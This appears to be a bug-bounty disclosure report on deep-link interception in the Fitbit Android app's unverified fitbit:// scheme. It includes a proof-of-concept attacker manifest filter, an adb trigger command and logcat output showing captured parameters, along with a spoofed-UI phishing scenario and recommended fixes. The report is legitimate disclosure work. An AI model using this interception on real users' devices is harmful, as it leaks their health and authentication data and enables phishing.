# Fitbit — Deep Link Interception via Unverified `fitbit://` Custom URI Scheme (Health Data, AI Health Chat, Auth Flows)

## Summary

The Fitbit app (`com.fitbit.FitbitMobile`) registers multiple BROWSABLE intent filters for the custom URI scheme `fitbit://` covering sensitive functionality: challenges/social features, device connections, an AI health-chat history viewer (`fitbit://askhealth/chathistory`), and an authentication flow endpoint (`fitbit://auth/seamless`). A zero-permission attacker app can register a competing intent filter for the same scheme, causing Android to display a disambiguation chooser whenever a `fitbit://` deep link is invoked. If the user selects the attacker app, the full URI and query parameters are captured.

## Severity: HIGH

- **Attack vector**: Local (malicious app installed on device)
- **Permissions required**: ZERO
- **User interaction**: User must select the attacker app from the system chooser
- **CIA impact**: Confidentiality (health/fitness deep-link parameters, AI health-chat navigation state, and authentication flow parameters leaked to a zero-permission attacker)

## Affected Components

- **Package**: `com.fitbit.FitbitMobile` (Fitbit)
- **Scheme**: `fitbit://`
- **Activities registered for the scheme** (confirmed via `dumpsys package`):

| Host / Path | Activity | Notes |
|---|---|---|
| `challenges`, `nudges`, `scale` | `DeepLinkActivity` | Social challenges, device pairing prompts |
| `auth/seamless` | `com.google.android.apps.fitbit.app.cronus.impl.deeplink.DMADeepLink` | Authentication flow endpoint |
| `askhealth/chathistory` | `com.google.android.apps.fitbit.app.askhealth.impl.deeplink.AskHealthGateway` | AI health-chat history viewer |
| `device-management/connections` | `DevicesAndConnectionsGateway` | Device connection management |
| `core-stats/{steps,floors,...}` | `FitnessDeeplink` | Fitness stats (marked `AutoVerify=true`, but verification does not apply to the `fitbit` custom scheme, only to any co-declared `https` filters) |

Example filter tested:

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="fitbit" android:host="challenges" />
</intent-filter>
```

**`autoVerify` cannot protect any of these filters** since `fitbit://` is a custom scheme, not `https://`. Digital Asset Links verification is a no-op for non-web schemes regardless of the `AutoVerify=true` attribute appearing in the manifest dump.

- **Tested on**: Pixel 6a, Android 17 Beta (API 37), September 2026

## Proof of Concept

### Attacker App (com.vrp.zeroperm)

```xml
<activity android:name=".OAuthInterceptActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="fitbit" />
    </intent-filter>
</activity>
```

### Reproduction Steps

1. Install the PoC APK (`poc.apk`) — holds **zero** Android permissions.
2. Trigger a Fitbit deep link:
   ```
   adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE \
     -d "fitbit://challenges?challenge_id=xyz789"
   ```
3. Android displays a chooser/"Open with ZeroPerm" confirmation.
4. If the user selects/confirms ZeroPerm, the URI and query parameters are captured.

### Runtime Proof

Foreground activity confirms the system dialog is actually shown:

```
topResumedActivity=ActivityRecord{... android/com.android.internal.app.ResolverActivity ...}
```

logcat after confirming ZeroPerm:

```
W OAUTH_INTERCEPT: === OAuth Scheme Interception PoC ===
W OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
W OAUTH_INTERCEPT: [+] Data URI: fitbit://challenges?challenge_id=xyz789
W OAUTH_INTERCEPT: [+] Param: challenge_id = xyz789
W OAUTH_INTERCEPT: === Zero-permission app intercepted OAuth callback ===
```

## Impact

### Confidentiality
- **Health/fitness deep-link parameters leaked**: challenge/device identifiers and, most notably, any navigation parameters passed to `fitbit://askhealth/chathistory` (the AI health-chat history feature) are exposed to a zero-permission attacker.
- **Auth flow interception**: `fitbit://auth/seamless` is registered for the same scheme; any authentication-related parameters routed through this custom-scheme entry point are subject to the same interception, since the whole `fitbit://` scheme is unverifiable.
- **Usage/behavior profiling**: The attacker learns when and how often the user engages with health features (challenges, AI health chat, device connections).

### Integrity
- **Feature hijack**: Selecting the attacker app prevents the intended Fitbit screen from opening; the attacker can present a spoofed Fitbit UI to phish further health data.

## Attack Scenario

1. A notification, widget, or companion device triggers `fitbit://askhealth/chathistory?...` to resume an AI health-chat session.
2. The attacker's zero-permission app is already installed on the device.
3. The chooser appears; if the user selects the attacker app, the chat-history navigation parameters are captured and the user is shown a spoofed "Fitbit" screen.

## Recommended Fix

1. Migrate `fitbit://` deep links to verified `https://www.fitbit.com/...` App Links with `autoVerify="true"` — several `FitnessDeeplink` filters already declare a `https`/`www.fitbit.com` counterpart, so the custom-scheme filters should be removed where a verified equivalent exists.
2. Validate the caller with `Activity.getCallingPackage()` for any remaining custom-scheme entry points, especially `auth/seamless` and `askhealth/chathistory`.
3. Remove `BROWSABLE` from filters not intended for arbitrary external senders.

## Files Attached

- `poc.apk` — Zero-permission PoC app (v1.54)
- `screen_fitbit_chooser.png` — Chooser showing ZeroPerm alongside Fitbit
- `screen_fitbit_data_capture.png` — ZeroPerm displaying captured `fitbit://` URI data
